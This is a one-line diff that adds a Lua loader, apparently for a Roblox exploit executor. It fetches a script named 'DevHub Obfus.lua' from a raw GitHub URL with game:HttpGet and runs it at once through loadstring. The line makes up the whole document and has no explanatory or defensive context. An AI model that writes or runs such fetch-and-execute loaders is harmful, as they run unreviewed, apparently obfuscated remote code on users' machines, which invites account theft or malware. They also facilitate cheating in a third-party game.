@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JustDevT/Roblox/main/DevHub%20Obfus.lua",true))()
